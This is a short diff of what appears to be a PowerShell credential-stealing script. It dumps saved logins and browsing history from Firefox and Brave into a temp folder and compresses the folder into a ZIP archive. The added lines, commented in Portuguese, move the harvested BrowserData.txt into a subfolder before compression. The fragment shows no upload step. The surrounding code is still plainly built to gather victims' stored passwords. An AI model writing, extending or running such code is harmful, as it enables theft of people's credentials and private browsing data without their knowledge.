@@ -531,6 +531,10 @@ Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\Br
 Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
+
+# Move o ficheiro para o local correto
+Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
